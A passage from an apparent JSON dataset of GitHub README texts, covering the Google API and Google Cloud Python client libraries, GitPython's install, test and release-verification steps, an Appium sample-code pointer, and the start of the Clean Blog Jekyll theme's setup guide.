Pro](http:\/\/www.losttype.com\/font\/?name=hankpro). Both are available through the wonderful [Lost Type Co-op](http:\/\/losttype.com).\n\nAdditional tests use [Fira](https:\/\/github.com\/mozilla\/Fira) from Mozilla, and [Source Code Pro](https:\/\/github.com\/adobe\/source-code-pro) from Adobe.\n\n## License\n\n[The MIT License (MIT)](LICENSE.md)\n\nCopyright \u00a9 2014\u20132015 [Kenneth Ormandy](http:\/\/kennethormandy.com)\n"},{"repo":"\/googleapis\/google-api-python-client","language":"Python","readme_contents":"# Google API Client\n\n[![PyPI version](https:\/\/badge.fury.io\/py\/google-api-python-client.svg)](https:\/\/badge.fury.io\/py\/google-api-python-client)\n\nThis is the Python client library for Google's discovery based APIs. To get started, please see the [docs folder](docs\/README.md).\n\nThese client libraries are officially supported by Google.  However, the libraries are considered complete and are in maintenance mode. This means that we will address critical bugs and security issues but will not add any new features.\n\n## Documentation\n\nSee the [docs folder](docs\/README.md) for more detailed instructions and additional documentation.\n\n## Google Cloud Platform\n\nFor Google Cloud Platform APIs such as Datastore, Cloud Storage or Pub\/Sub, we recommend using [Cloud Client Libraries for Python](https:\/\/github.com\/GoogleCloudPlatform\/google-cloud-python) which is under active development.\n\n## Installation\n\nInstall this library in a [virtualenv](https:\/\/virtualenv.pypa.io\/en\/latest\/) using pip. virtualenv is a tool to\ncreate isolated Python environments. The basic problem it addresses is one of\ndependencies and versions, and indirectly permissions.\n\nWith virtualenv, it's possible to install this library without needing system\ninstall permissions, and without clashing with the installed system\ndependencies.\n\n### Mac\/Linux\n\n```\npip install virtualenv\nvirtualenv <your-env>\nsource <your-env>\/bin\/activate\n<your-env>\/bin\/pip install google-api-python-client\n```\n\n### Windows\n\n```\npip install virtualenv\nvirtualenv <your-env>\n<your-env>\\Scripts\\activate\n<your-env>\\Scripts\\pip.exe install google-api-python-client\n```\n\n## Supported Python Versions\n\nPython 3.4, 3.5, 3.6 and 3.7 are fully supported and tested. This library may work on later versions of 3, but we do not currently run tests against those versions\n\n## Deprecated Python Versions\n\nPython == 2.7\n\n## Third Party Libraries and Dependencies\n\nThe following libraries will be installed when you install the client library:\n* [httplib2](https:\/\/github.com\/httplib2\/httplib2)\n* [uritemplate](https:\/\/github.com\/sigmavirus24\/uritemplate)\n\nFor development you will also need the following libraries:\n* [WebTest](http:\/\/webtest.pythonpaste.org\/en\/latest\/index.html)\n* [pycrypto](https:\/\/pypi.python.org\/pypi\/pycrypto)\n* [pyopenssl](https:\/\/pypi.python.org\/pypi\/pyOpenSSL)\n\n## Contributing\n\nPlease see the [contributing page](http:\/\/google.github.io\/google-api-python-client\/contributing.html) for more information. In particular, we love pull requests - but please make sure to sign the contributor license agreement.\n"},{"repo":"\/cod3rcursos\/curso-react-redux","language":"HTML","readme_contents":"# Curso React-Redux\n"},{"repo":"\/googleapis\/google-cloud-python","language":"Python","readme_contents":"Google Cloud Python Client\n==========================\n\nPython idiomatic clients for `Google Cloud Platform`_ services.\n\n.. _Google Cloud Platform: https:\/\/cloud.google.com\/\n\n**Heads up**! These libraries are supported on App Engine standard's `Python 3 runtime`_ but are *not* supported on App Engine's `Python 2 runtime`_.\n\n.. _Python 3 runtime: https:\/\/cloud.google.com\/appengine\/docs\/standard\/python3\n.. _Python 2 runtime: https:\/\/cloud.google.com\/appengine\/docs\/standard\/python\n\nGeneral Availability\n--------------------\n\n**GA** (general availability) indicates that the client library for a\nparticular service is stable, and that the code surface will not change in\nbackwards-incompatible ways unless either absolutely necessary (e.g. because\nof critical security issues) or with an extensive deprecation period.\nIssues and requests against GA libraries are addressed with the highest\npriority.\n\n.. note::\n\n    Sub-components of GA libraries explicitly marked as beta in the\n    import path (e.g. ``google.cloud.language_v1beta2``) should be considered\n    to be beta.\n\nThe following client libraries have **GA** support:\n\n-  `Google BigQuery`_ (`BigQuery README`_, `BigQuery Documentation`_)\n-  `Google Cloud Bigtable`_ (`Bigtable README`_, `Bigtable Documentation`_)\n-  `Google Cloud Datastore`_ (`Datastore README`_, `Datastore Documentation`_)\n-  `Google Cloud KMS`_ (`KMS README`_, `KMS Documentation`_)\n-  `Google Cloud Natural Language`_ (`Natural Language README`_, `Natural Language Documentation`_)\n-  `Google Cloud Pub\/Sub`_ (`Pub\/Sub README`_, `Pub\/Sub Documentation`_)\n-  `Google Cloud Scheduler`_ (`Scheduler README`_, `Scheduler Documentation`_)\n-  `Google Cloud Spanner`_ (`Spanner README`_, `Spanner Documentation`_)\n-  `Google Cloud Speech to Text`_ (`Speech to Text README`_, `Speech to Text Documentation`_)\n-  `Google Cloud Storage`_ (`Storage README`_, `Storage Documentation`_)\n-  `Google Cloud Tasks`_ (`Tasks README`_, `Tasks Documentation`_)\n-  `Google Cloud Translation`_ (`Translation README`_, `Translation Documentation`_)\n-  `Stackdriver Logging`_ (`Logging README`_, `Logging Documentation`_)\n\n.. _Google BigQuery: https:\/\/pypi.org\/project\/google-cloud-bigquery\/\n.. _BigQuery README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/bigquery\n.. _BigQuery Documentation: https:\/\/googleapis.dev\/python\/bigquery\/latest\n\n.. _Google Cloud Bigtable: https:\/\/pypi.org\/project\/google-cloud-bigtable\/\n.. _Bigtable README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/bigtable\n.. _Bigtable Documentation: https:\/\/googleapis.dev\/python\/bigtable\/latest\n\n.. _Google Cloud Datastore: https:\/\/pypi.org\/project\/google-cloud-datastore\/\n.. _Datastore README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/datastore\n.. _Datastore Documentation: https:\/\/googleapis.dev\/python\/datastore\/latest \n\n.. _Google Cloud KMS: https:\/\/pypi.org\/project\/google-cloud-kms\/\n.. _KMS README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/kms\n.. _KMS Documentation: https:\/\/googleapis.dev\/python\/cloudkms\/latest\n\n.. _Google Cloud Natural Language: https:\/\/pypi.org\/project\/google-cloud-language\/\n.. _Natural Language README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/language\n.. _Natural Language Documentation: https:\/\/googleapis.dev\/python\/language\/latest\n\n.. _Google Cloud Pub\/Sub: https:\/\/pypi.org\/project\/google-cloud-pubsub\/\n.. _Pub\/Sub README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/pubsub\n.. _Pub\/Sub Documentation: https:\/\/googleapis.dev\/python\/pubsub\/latest\n\n.. _Google Cloud Spanner: https:\/\/pypi.org\/project\/google-cloud-spanner\n.. _Spanner README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/spanner\n.. _Spanner Documentation: https:\/\/googleapis.dev\/python\/spanner\/latest\n\n.. _Google Cloud Speech to Text: https:\/\/pypi.org\/project\/google-cloud-speech\/\n.. _Speech to Text README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/speech\n.. _Speech to Text Documentation: https:\/\/googleapis.dev\/python\/speech\/latest\n\n.. _Google Cloud Storage: https:\/\/pypi.org\/project\/google-cloud-storage\/\n.. _Storage README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/storage\n.. _Storage Documentation: https:\/\/googleapis.dev\/python\/storage\/latest\n\n.. _Google Cloud Tasks: https:\/\/pypi.org\/project\/google-cloud-tasks\/\n.. _Tasks README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/tasks\n.. _Tasks Documentation: https:\/\/googleapis.dev\/python\/cloudtasks\/latest\n\n.. _Google Cloud Translation: https:\/\/pypi.org\/project\/google-cloud-translate\/\n.. _Translation README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/translate\n.. _Translation Documentation: https:\/\/googleapis.dev\/python\/translation\/latest\n\n.. _Google Cloud Scheduler: https:\/\/pypi.org\/project\/google-cloud-scheduler\/\n.. _Scheduler README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/scheduler\n.. _Scheduler Documentation: https:\/\/googleapis.dev\/python\/cloudscheduler\/latest\n\n.. _Stackdriver Logging: https:\/\/pypi.org\/project\/google-cloud-logging\/\n.. _Logging README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/logging\n.. _Logging Documentation: https:\/\/googleapis.dev\/python\/logging\/latest\n\nBeta Support\n------------\n\n**Beta** indicates that the client library for a particular service is\nmostly stable and is being prepared for release. Issues and requests\nagainst beta libraries are addressed with a higher priority.\n\nThe following client libraries have **beta** support:\n\n-  `Google Cloud Firestore`_ (`Firestore README`_, `Firestore Documentation`_)\n-  `Google Cloud Video Intelligence`_ (`Video Intelligence README`_, `Video Intelligence Documentation`_)\n-  `Google Cloud Vision`_ (`Vision README`_, `Vision Documentation`_)\n\n.. _Google Cloud Firestore: https:\/\/pypi.org\/project\/google-cloud-firestore\/\n.. _Firestore README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/firestore\n.. _Firestore Documentation: https:\/\/googleapis.dev\/python\/firestore\/latest\n\n.. _Google Cloud Video Intelligence: https:\/\/pypi.org\/project\/google-cloud-videointelligence\n.. _Video Intelligence README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/videointelligence\n.. _Video Intelligence Documentation: https:\/\/googleapis.dev\/python\/videointelligence\/latest\n\n.. _Google Cloud Vision: https:\/\/pypi.org\/project\/google-cloud-vision\/\n.. _Vision README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/vision\n.. _Vision Documentation: https:\/\/googleapis.dev\/python\/vision\/latest\n\n\nAlpha Support\n-------------\n\n**Alpha** indicates that the client library for a particular service is\nstill a work-in-progress and is more likely to get backwards-incompatible\nupdates. See `versioning`_ for more details.\n\nThe following client libraries have **alpha** support:\n\n-  `Google Cloud Asset`_ (`Asset README`_, `Asset Documentation`_)\n-  `Google Cloud AutoML`_ (`AutoML README`_, `AutoML Documentation`_)\n-  `Google BigQuery Data Transfer`_ (`BigQuery Data Transfer README`_, `BigQuery Documentation`_)\n-  `Google Cloud Bigtable - HappyBase`_ (`HappyBase README`_, `HappyBase Documentation`_)\n-  `Google Cloud Build`_ (`Cloud Build README`_, `Cloud Build Documentation`_)\n-  `Google Cloud Container`_ (`Container README`_, `Container Documentation`_)\n-  `Google Cloud Container Analysis`_ (`Container Analysis README`_, `Container Analysis Documentation`_)\n-  `Google Cloud Dataproc`_ (`Dataproc README`_, `Dataproc Documentation`_)\n-  `Google Cloud DLP`_ (`DLP README`_, `DLP Documentation`_)\n-  `Google Cloud DNS`_ (`DNS README`_, `DNS Documentation`_)\n-  `Google Cloud IoT`_ (`IoT README`_, `IoT Documentation`_)\n-  `Google Cloud Memorystore for Redis`_ (`Redis README`_, `Redis Documentation`_)\n-  `Google Cloud Recommender`_ (`Recommender README`_, `Recommender Documentation`_)\n-  `Google Cloud Resource Manager`_ (`Resource Manager README`_, `Resource Manager Documentation`_)\n-  `Google Cloud Runtime Configuration`_ (`Runtime Config README`_, `Runtime Config Documentation`_)\n-  `Google Cloud Security Scanner`_ (`Security Scanner README`_ , `Security Scanner Documentation`_)\n-  `Google Cloud Trace`_ (`Trace README`_, `Trace Documentation`_)\n-  `Google Cloud Text-to-Speech`_ (`Text-to-Speech README`_, `Text-to-Speech Documentation`_)\n-  `Grafeas`_ (`Grafeas README`_, `Grafeas Documentation`_)\n-  `Stackdriver Error Reporting`_ (`Error Reporting README`_, `Error Reporting Documentation`_)\n-  `Stackdriver Monitoring`_ (`Monitoring README`_, `Monitoring Documentation`_)\n\n.. _Google Cloud Asset: https:\/\/pypi.org\/project\/google-cloud-asset\/\n.. _Asset README: https:\/\/github.com\/googleapis\/google-cloud-python\/blob\/master\/asset\n.. _Asset Documentation: https:\/\/googleapis.dev\/python\/cloudasset\/latest\n\n.. _Google Cloud AutoML: https:\/\/pypi.org\/project\/google-cloud-automl\/\n.. _AutoML README: https:\/\/github.com\/googleapis\/google-cloud-python\/blob\/master\/automl\n.. _AutoML Documentation: https:\/\/googleapis.dev\/python\/automl\/latest\n\n.. _Google BigQuery Data Transfer: https:\/\/pypi.org\/project\/google-cloud-bigquery-datatransfer\/\n.. _BigQuery Data Transfer README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/bigquery_datatransfer\n.. _BigQuery Documentation: https:\/\/googleapis.dev\/python\/bigquery\/latest\n\n.. _Google Cloud Bigtable - HappyBase: https:\/\/pypi.org\/project\/google-cloud-happybase\/\n.. _HappyBase README: https:\/\/github.com\/googleapis\/google-cloud-python-happybase\n.. _HappyBase Documentation: https:\/\/google-cloud-python-happybase.readthedocs.io\/en\/latest\/\n\n.. _Google Cloud Build: https:\/\/pypi.org\/project\/google-cloud-build\/\n.. _Cloud Build README: https:\/\/github.com\/googleapis\/google-cloud-python\/cloudbuild\n.. _Cloud Build Documentation: https:\/\/googleapis.dev\/python\/cloudbuild\/latest\n\n.. _Google Cloud Container: https:\/\/pypi.org\/project\/google-cloud-container\/\n.. _Container README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/container\n.. _Container Documentation: https:\/\/googleapis.dev\/python\/container\/latest\n\n.. _Google Cloud Container Analysis: https:\/\/pypi.org\/project\/google-cloud-containeranalysis\/\n.. _Container Analysis README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/containeranalysis\n.. _Container Analysis Documentation: https:\/\/googleapis.dev\/python\/containeranalysis\/latest\n\n.. _Google Cloud Dataproc: https:\/\/pypi.org\/project\/google-cloud-dataproc\/\n.. _Dataproc README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/dataproc\n.. _Dataproc Documentation: https:\/\/googleapis.dev\/python\/dataproc\/latest\n\n.. _Google Cloud DLP: https:\/\/pypi.org\/project\/google-cloud-dlp\/\n.. _DLP README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/dlp\n.. _DLP Documentation: https:\/\/googleapis.dev\/python\/dlp\/latest\n\n.. _Google Cloud DNS: https:\/\/pypi.org\/project\/google-cloud-dns\/\n.. _DNS README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/dns\n.. _DNS Documentation: https:\/\/googleapis.dev\/python\/dns\/latest\n\n.. _Google Cloud IoT: https:\/\/pypi.org\/project\/google-cloud-iot\/\n.. _IoT README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/iot\n.. _IoT Documentation: https:\/\/googleapis.dev\/python\/cloudiot\/latest\n\n.. _Google Cloud Memorystore for Redis: https:\/\/pypi.org\/project\/google-cloud-redis\/\n.. _Redis README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/redis\n.. _Redis Documentation: https:\/\/googleapis.dev\/python\/redis\/latest\n\n.. _Google Cloud Recommender: https:\/\/pypi.org\/project\/google-cloud-recommender\/\n.. _Recommender README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/recommender\n.. _Recommender Documentation: https:\/\/googleapis.dev\/python\/recommender\/latest\n\n.. _Google Cloud Resource Manager: https:\/\/pypi.org\/project\/google-cloud-resource-manager\/\n.. _Resource Manager README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/resource_manager\n.. _Resource Manager Documentation: https:\/\/googleapis.dev\/python\/cloudresourcemanager\/latest\n\n.. _Google Cloud Runtime Configuration: https:\/\/pypi.org\/project\/google-cloud-runtimeconfig\/\n.. _Runtime Config README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/runtimeconfig\n.. _Runtime Config Documentation: https:\/\/googleapis.dev\/python\/runtimeconfig\/latest\n\n.. _Google Cloud Security Scanner: https:\/\/pypi.org\/project\/google-cloud-websecurityscanner\/\n.. _Security Scanner README: https:\/\/github.com\/googleapis\/google-cloud-python\/blob\/master\/websecurityscanner\n.. _Security Scanner Documentation: https:\/\/googleapis.dev\/python\/websecurityscanner\/latest\n\n.. _Google Cloud Text-to-Speech: https:\/\/pypi.org\/project\/google-cloud-texttospeech\/\n.. _Text-to-Speech README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/texttospeech\n.. _Text-to-Speech Documentation: https:\/\/googleapis.dev\/python\/texttospeech\/latest\n\n.. _Google Cloud Trace: https:\/\/pypi.org\/project\/google-cloud-trace\/\n.. _Trace README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/trace\n.. _Trace Documentation: https:\/\/googleapis.dev\/python\/cloudtrace\/latest\n\n.. _Grafeas: https:\/\/pypi.org\/project\/grafeas\/\n.. _Grafeas README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/grafeas\n.. _Grafeas Documentation: https:\/\/googleapis.dev\/python\/grafeas\/latest\n\n.. _Stackdriver Error Reporting: https:\/\/pypi.org\/project\/google-cloud-error-reporting\/\n.. _Error Reporting README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/error_reporting\n.. _Error Reporting Documentation: https:\/\/googleapis.dev\/python\/clouderrorreporting\/latest\n\n.. _Stackdriver Monitoring: https:\/\/pypi.org\/project\/google-cloud-monitoring\/\n.. _Monitoring README: https:\/\/github.com\/googleapis\/google-cloud-python\/tree\/master\/monitoring\n.. _Monitoring Documentation: https:\/\/googleapis.dev\/python\/monitoring\/latest\n\n.. _versioning: https:\/\/github.com\/googleapis\/google-cloud-python\/blob\/master\/CONTRIBUTING.rst#versioning\n\nIf you need support for other Google APIs, check out the\n`Google APIs Python Client library`_.\n\n.. _Google APIs Python Client library: https:\/\/github.com\/google\/google-api-python-client\n\n\nExample Applications\n--------------------\n\n-  `getting-started-python`_ - A sample and `tutorial`_ that demonstrates how to build a complete web application using Cloud Datastore, Cloud Storage, and Cloud Pub\/Sub and deploy it to Google App Engine or Google Compute Engine.\n-  `google-cloud-python-expenses-demo`_ - A sample expenses demo using Cloud Datastore and Cloud Storage\n\n.. _getting-started-python: https:\/\/github.com\/GoogleCloudPlatform\/getting-started-python\n.. _tutorial: https:\/\/cloud.google.com\/python\n.. _google-cloud-python-expenses-demo: https:\/\/github.com\/GoogleCloudPlatform\/google-cloud-python-expenses-demo\n\n\nAuthentication\n--------------\n\nWith ``google-cloud-python`` we try to make authentication as painless as possible.\nCheck out the `Authentication section`_ in our documentation to learn more.\nYou may also find the `authentication document`_ shared by all the\n``google-cloud-*`` libraries to be helpful.\n\n.. _Authentication section: https:\/\/googleapis.dev\/python\/google-api-core\/latest\/auth.html\n.. _authentication document: https:\/\/github.com\/googleapis\/google-cloud-common\/tree\/master\/authentication\n\nContributing\n------------\n\nContributions to this library are always welcome and highly encouraged.\n\nSee the `CONTRIBUTING doc`_ for more information on how to get started.\n\n.. _CONTRIBUTING doc: https:\/\/github.com\/googleapis\/google-cloud-python\/blob\/master\/CONTRIBUTING.rst\n\n\nCommunity\n---------\n\nGoogle Cloud Platform Python developers hang out in `Slack`_ in the ``#python``\nchannel, click here to `get an invitation`_.\n\n.. _Slack: https:\/\/googlecloud-community.slack.com\n.. _get an invitation: https:\/\/gcp-slack.appspot.com\/\n\n\nLicense\n-------\n\nApache 2.0 - See `the LICENSE`_ for more information.\n\n.. _the LICENSE: https:\/\/github.com\/googleapis\/google-cloud-python\/blob\/master\/LICENSE\n"},{"repo":"\/gitpython-developers\/GitPython","language":"Python","readme_contents":"## GitPython\n\nGitPython is a python library used to interact with git repositories, high-level like git-porcelain,\nor low-level like git-plumbing.\n\nIt provides abstractions of git objects for easy access of repository data, and additionally\nallows you to access the git repository more directly using either a pure python implementation,\nor the faster, but more resource intensive *git command* implementation.\n\nThe object database implementation is optimized for handling large quantities of objects and large datasets,\nwhich is achieved by using low-level structures and data streaming.\n\n\n### REQUIREMENTS\n\nGitPython needs the `git` executable to be installed on the system and available\nin your `PATH` for most operations.\nIf it is not in your `PATH`, you can help GitPython find it by setting\nthe `GIT_PYTHON_GIT_EXECUTABLE=<path\/to\/git>` environment variable.\n\n* Git (1.7.x or newer)\n* Python 3 to 3.7.\n\nThe list of dependencies are listed in `.\/requirements.txt` and `.\/test-requirements.txt`.\nThe installer takes care of installing them for you.\n\n### INSTALL\n\nIf you have downloaded the source code:\n\n    python setup.py install\n\nor if you want to obtain a copy from the Pypi repository:\n\n    pip install GitPython\n\nBoth commands will install the required package dependencies.\n\nA distribution package can be obtained for manual installation at:\n\n    http:\/\/pypi.python.org\/pypi\/GitPython\n\nIf you like to clone from source, you can do it like so:\n\n```bash\ngit clone https:\/\/github.com\/gitpython-developers\/GitPython\ngit submodule update --init --recursive\n.\/init-tests-after-clone.sh\n```\n\n### Limitations\n\n#### Leakage of System Resources\n\nGitPython is not suited for long-running processes (like daemons) as it tends to\nleak system resources. It was written in a time where destructors (as implemented\nin the `__del__` method) still ran deterministically.\n\nIn case you still want to use it in such a context, you will want to search the\ncodebase for `__del__` implementations and call these yourself when you see fit.\n\nAnother way assure proper cleanup of resources is to factor out GitPython into a\nseparate process which can be dropped periodically.\n\n#### Windows support\n\nFor *Windows*, we do regularly test it on [Appveyor CI](https:\/\/www.appveyor.com\/)\nbut not all test-cases pass - you may help improve them by exploring\n[Issue #525](https:\/\/github.com\/gitpython-developers\/GitPython\/issues\/525).\n\n### RUNNING TESTS\n\n*Important*: Right after cloning this repository, please be sure to have executed\nthe `.\/init-tests-after-clone.sh` script in the repository root. Otherwise\nyou will encounter test failures.\n\nOn *Windows*, make sure you have `git-daemon` in your PATH.  For MINGW-git, the `git-daemon.exe`\nexists in `Git\\mingw64\\libexec\\git-core\\`; CYGWIN has no daemon, but should get along fine\nwith MINGW's.\n\nThe easiest way to run tests is by using [tox](https:\/\/pypi.python.org\/pypi\/tox)\na wrapper around virtualenv. It will take care of setting up environments with the proper\ndependencies installed and execute test commands. To install it simply:\n\n    pip install tox\n\nThen run:\n\n    tox\n\n\nFor more fine-grained control, you can use `nose`.\n\n### Contributions\n\nPlease have a look at the [contributions file][contributing].\n\n### INFRASTRUCTURE\n\n* [User Documentation](http:\/\/gitpython.readthedocs.org)\n* [Questions and Answers](http:\/\/stackexchange.com\/filters\/167317\/gitpython)\n * Please post on stackoverflow and use the `gitpython` tag\n* [Issue Tracker](https:\/\/github.com\/gitpython-developers\/GitPython\/issues)\n  * Post reproducible bugs and feature requests as a new issue.\n    Please be sure to provide the following information if posting bugs:\n    * GitPython version (e.g. `import git; git.__version__`)\n    * Python version (e.g. `python --version`)\n    * The encountered stack-trace, if applicable\n    * Enough information to allow reproducing the issue\n\n### How to make a new release\n\n* Update\/verify the **version** in the `VERSION` file\n* Update\/verify that the `doc\/source\/changes.rst` changelog file was updated\n* Commit everything\n* Run `git tag -s <version>` to tag the version in Git\n* Run `make release`\n* Close the milestone mentioned in the _changelog_ and create a new one. _Do not reuse milestones by renaming them_.\n* set the upcoming version in the `VERSION` file, usually be\n  incrementing the patch level, and possibly by appending `-dev`. Probably you\n  want to `git push` once more.\n\n### How to verify a release\n\nPlease only use releases from `pypi` as you can verify the respective source\ntarballs.\n\nThis script shows how to verify the tarball was indeed created by the authors of\nthis project:\n\n```\ncurl https:\/\/pypi.python.org\/packages\/5b\/38\/0433c06feebbfbb51d644129dbe334031c33d55af0524326266f847ae907\/GitPython-2.1.8-py2.py3-none-any.whl#md5=6b73ae86ee2dbab6da8652b2d875013a  > gitpython.whl\ncurl https:\/\/pypi.python.org\/packages\/5b\/38\/0433c06feebbfbb51d644129dbe334031c33d55af0524326266f847ae907\/GitPython-2.1.8-py2.py3-none-any.whl.asc > gitpython-signature.asc\ngpg --verify gitpython-signature.asc gitpython.whl\n```\n\nwhich outputs\n\n```\ngpg: Signature made Mon Dec 11 17:34:17 2017 CET\ngpg:                using RSA key C3BC52BD76E2C23BAC6EC06A665F99FA9D99966C\ngpg:                issuer \"byronimo@gmail.com\"\ngpg: Good signature from \"Sebastian Thiel (I do trust in Rust!) <byronimo@gmail.com>\" [ultimate]\n```\n\nYou can verify that the keyid indeed matches the release-signature key provided in this\nrepository by looking at the keys details:\n\n```\ngpg --list-packets .\/release-verification-key.asc\n```\n\nYou can verify that the commit adding it was also signed by it using:\n\n```\ngit show --show-signature  .\/release-verification-key.asc\n```\n\nIf you would like to trust it permanently, you can import and sign it:\n\n```\ngpg --import .\/release-verification-key.asc\ngpg --edit-key 88710E60\n\n> sign\n> save\n```\n\n### Projects using GitPython\n\n* [PyDriller](https:\/\/github.com\/ishepard\/pydriller)\n* [Kivy Designer](https:\/\/github.com\/kivy\/kivy-designer)\n* [Prowl](https:\/\/github.com\/nettitude\/Prowl)\n* [Python Taint](https:\/\/github.com\/python-security\/pyt)\n* [Buster](https:\/\/github.com\/axitkhurana\/buster)\n* [git-ftp](https:\/\/github.com\/ezyang\/git-ftp)\n* [Git-Pandas](https:\/\/github.com\/wdm0006\/git-pandas)\n* [PyGitUp](https:\/\/github.com\/msiemens\/PyGitUp)\n* [PyJFuzz](https:\/\/github.com\/mseclab\/PyJFuzz)\n* [Loki](https:\/\/github.com\/Neo23x0\/Loki)\n* [Omniwallet](https:\/\/github.com\/OmniLayer\/omniwallet)\n* [GitViper](https:\/\/github.com\/BeayemX\/GitViper)\n* [Git Gud](https:\/\/github.com\/bthayer2365\/git-gud)\n\n### LICENSE\n\nNew BSD License.  See the LICENSE file.\n\n### DEVELOPMENT STATUS\n\n[![codecov](https:\/\/codecov.io\/gh\/gitpython-developers\/GitPython\/branch\/master\/graph\/badge.svg)](https:\/\/codecov.io\/gh\/gitpython-developers\/GitPython)\n[![Build Status](https:\/\/travis-ci.org\/gitpython-developers\/GitPython.svg)](https:\/\/travis-ci.org\/gitpython-developers\/GitPython)\n[![Build status](https:\/\/ci.appveyor.com\/api\/projects\/status\/0f3pi3c00hajlrsd\/branch\/master?svg=true&passingText=windows%20OK&failingText=windows%20failed)](https:\/\/ci.appveyor.com\/project\/Byron\/gitpython\/branch\/master)\n[![Code Climate](https:\/\/codeclimate.com\/github\/gitpython-developers\/GitPython\/badges\/gpa.svg)](https:\/\/codeclimate.com\/github\/gitpython-developers\/GitPython)\n[![Documentation Status](https:\/\/readthedocs.org\/projects\/gitpython\/badge\/?version=stable)](https:\/\/readthedocs.org\/projects\/gitpython\/?badge=stable)\n[![Stories in Ready](https:\/\/badge.waffle.io\/gitpython-developers\/GitPython.png?label=ready&title=Ready)](https:\/\/waffle.io\/gitpython-developers\/GitPython)\n[![Packaging status](https:\/\/repology.org\/badge\/tiny-repos\/python:gitpython.svg)](https:\/\/repology.org\/metapackage\/python:gitpython\/versions)\n[![Throughput Graph](https:\/\/graphs.waffle.io\/gitpython-developers\/GitPython\/throughput.svg)](https:\/\/waffle.io\/gitpython-developers\/GitPython\/metrics\/throughput)\n\n\nNow that there seems to be a massive user base, this should be motivation enough to let git-python\nreturn to a proper state, which means\n\n* no open pull requests\n* no open issues describing bugs\n\n[contributing]: https:\/\/github.com\/gitpython-developers\/GitPython\/blob\/master\/CONTRIBUTING.md\n"},{"repo":"\/appium-boneyard\/sample-code","language":"HTML","readme_contents":"**Refer https:\/\/github.com\/appium\/appium\/tree\/master\/sample-code instead of this repository**\n\n# sample-code\n\nThis repository contains sample applications which are used mostly by appium functional tests.\n"},{"repo":"\/BlackrockDigital\/startbootstrap-clean-blog-jekyll","language":"HTML","readme_contents":"# [Start Bootstrap - Clean Blog Jekyll](https:\/\/startbootstrap.com\/template-overviews\/clean-blog-jekyll\/) - Official Jekyll Version\n\n[Clean Blog Jekyll](http:\/\/startbootstrap.com\/template-overviews\/clean-blog-jekyll\/) is a stylish, responsive blog theme for [Bootstrap](http:\/\/getbootstrap.com\/) created by [Start Bootstrap](http:\/\/startbootstrap.com\/). This theme features a blog homepage, about page, contact page, and an example post page along with a working contact form powered by [Formspree](https:\/\/formspree.io\/).\n\nThis repository holds the official Jekyll version of the Clean Blog theme on Start Bootstrap!\n\n## Preview\n\n[![Clean Blog (Jekyll) Preview](https:\/\/startbootstrap.com\/assets\/img\/screenshots\/themes\/clean-blog-jekyll.png)](http:\/\/blackrockdigital.github.io\/startbootstrap-clean-blog-jekyll\/)\n\n**[View Live Preview](http:\/\/blackrockdigital.github.io\/startbootstrap-clean-blog-jekyll\/)**\n\n## Installation & Setup\n\n### Using RubyGems:\n\nWhen installing the theme using RubyGems, demo images, posts, and pages are not included. Follow the instructions below for complete setup.\n\n1. (Optional) Create a new Jekyll site: `jekyll new my-site`\n2. Replace the current theme in your `Gemfile` with `gem \"jekyll-theme-clean-blog\"`.\n3. Install the theme: `bundle install`\n4. Replace the current theme in your `_config.yml` file with `theme: jekyll-theme-clean-blog`.\n5. Build your site: `bundle exec jekyll serve`\n\nAssuming there are no errors and the site is building properly, follow these steps next:\n\n1. Create the following pages if they do not exist already (or change the extension of exisitig markdown files from `.md` to `.html`):\n   - `index.html` - set to `layout: home`\n   - `about.html` - set to `layout: page`\n   - `contact.html` - set to `layout: page`\n   - `posts\/index.html` - set to `layout: page` (you will also need to create a `posts` directory)\n2. Configure the `index.html` front matter. Example:\n```\n---\nlayout: home\nbackground: '\/PATH_TO_IMAGE'\n---\n```\n3. Configure the `about.html`, `contact.html`, and `posts\/index.html` front matter. Example:\n```\n---\nlayout: page\ntitle: Page Title\ndescription: This is the page description.\nbackground: '\/PATH_TO_IMAGE'\n---\n```\n4. For each post in the `_posts` directory, update the front matter. Example:\n```\n---\nlayout: post\ntitle: \"Post Title\"\nsubtitle: \"This is the post subtitle.\"\ndate: YYYY-MM-DD HH:MM:SS\nbackground: '\/PATH_TO_IMAGE'\n---\n```\n\nFor reference, look at the [demo repository](https:\/\/github.com\/BlackrockDigital\/startbootstrap-clean-blog-jekyll) to see how the files are set up.\n\n5. Add the form to the `contact.html` page. Add the following code to your `contact.html` page:\n```\n<form name=\"sentMessage\" id=\"contactForm\" novalidate>\n  <div class=\"control-group\">\n    <div class=\"form-group floating-label-form-group controls\">\n      <label>Name<\/label>\n      <input type=\"text\" class=\"form-control\" placeholder=\"Name\" 